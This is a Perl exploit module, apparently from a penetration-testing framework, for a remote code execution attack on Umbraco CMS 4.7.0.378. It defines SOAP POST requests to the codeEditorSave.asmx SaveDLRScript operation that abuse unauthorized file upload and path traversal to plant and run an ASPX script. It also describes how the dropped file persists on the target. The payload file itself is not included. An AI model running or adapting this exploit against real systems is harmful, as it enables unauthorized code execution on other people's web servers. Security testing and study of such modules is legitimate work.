package UMBRACO::MSF::UmbracoUploadAspx;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "UmbracoUploadAspx";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module can be used to execute a payload on Umbraco CMS 4.7.0.378.

        The payload is uploaded as an ASPX script by sending a specially crafted

        SOAP request to codeEditorSave.asmx, which permits unauthorized file upload

        via the SaveDLRScript operation. SaveDLRScript is also subject to a path

        traversal vulnerability, allowing code to be placed into the web-accessible

        /umbraco/ directory.



        The module writes, executes and then overwrites an ASPX script; note that

        though the script content is removed, the file remains on the target. Automatic

        cleanup of the file is intended if a meterpreter payload is used.



        This module has been tested successfully on Umbraco CMS 4.7.0.378 on a Windows

        7 32-bit SP1. In this scenario, the \"IIS APPPOOL\\ASP.NET v4.0\" user must have

        write permissions on the Windows Temp folder.

      ",
  MSF_MODULE => "umbraco_upload_aspx",
  OSVDB => 83765,
  PATHS => ["umbraco/"],
  REFERENCES => [
    "http://blog.gdssecurity.com/labs/2012/7/3/find-bugs-faster-with-a-webmatrix-local-reference-instance.html",
    "http://umbraco.codeplex.com/workitem/18192",
  ],
  TITLE => "Umbraco CMS Remote Command Execution",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The URI path of the Umbraco login page",
  VALUE => "/umbraco/",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'WINDOWS',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'webservices/codeEditorSave.asmx',
      PAYLOAD      => read_file('MSFExploits/UMBRACO/MSF/src/UmbracoUploadAspx.payload', 1),
      TEXT   => 'Sending Exploit #1 Request : [POST] /webservices/codeEditorSave.asmx',
      HEADERS      => {
        'SOAPAction' => '"http://tempuri.org/SaveDLRScript"',
        'Content-Type' => 'text/xml; charset=utf-8',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT2 => {
      METHOD       => 'POST',
      PATH   => 'webservices/codeEditorSave.asmx',
      PAYLOAD      => read_file('MSFExploits/UMBRACO/MSF/src/UmbracoUploadAspx.payload', 1),
      TEXT   => 'Sending Exploit #2 Request : [POST] /webservices/codeEditorSave.asmx',
      HEADERS      => {
        'SOAPAction' => '"http://tempuri.org/SaveDLRScript"',
        'Content-Type' => 'text/xml; charset=utf-8',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
